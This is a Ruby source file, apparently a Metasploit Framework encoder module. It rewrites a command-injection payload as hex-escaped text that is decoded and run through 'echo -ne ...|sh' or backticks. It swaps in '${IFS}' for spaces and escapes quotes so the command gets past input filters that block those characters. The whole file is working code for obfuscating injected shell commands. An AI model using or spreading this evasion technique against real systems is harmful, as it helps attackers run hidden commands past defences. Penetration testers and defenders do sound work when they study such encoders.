require 'msf/core'

module Msf
module Encoders
module Cmd

class HexBashEcho < Msf::Encoder

	def initialize
		super(
			'Name'             => 'BASH echo -e Hex Encoding',
			'Version'          => '$Revision$',
			'Description'      => %q{
				This encoder uses the "-e" option available in recent
			versions of BASH to encode the command string. This 
			encoder will only work on recent Linux distributions or 
			situations where a new version of BASH is used to inject
			the supplied command string.
			},
			'Author'           => 'hdm',
			'Platform'         => 'linux',
			'Arch'             => ARCH_CMD)
	end

	
	#
	# Encodes the payload
	#
	def encode_block(state, buf)
	
		hex = ''
		
		# Can we use single quotes to enclose the echo arguments?
		if (state.badchars.include?("'"))
			hex = buf.unpack('C*').collect { |c| "\\\\\\x%.2x" % c }.join
		else
			hex = "'" + buf.unpack('C*').collect { |c| "\\x%.2x" % c }.join + "'"
		end
		
		# Are pipe characters restricted?
		if (state.badchars.include?("|"))
			
			# How about backticks?
			if (state.badchars.include?("`"))
				raise RuntimeError
			else
				buf = "`echo -ne #{hex}`"
			end
		else
			buf = "echo -ne #{hex}|sh"
		end
		
		# Remove spaces from the command string
		if (state.badchars.include?(" "))
			buf.gsub!(/\s/, '${IFS}')
		end
		
		return buf
	end

end

end end end
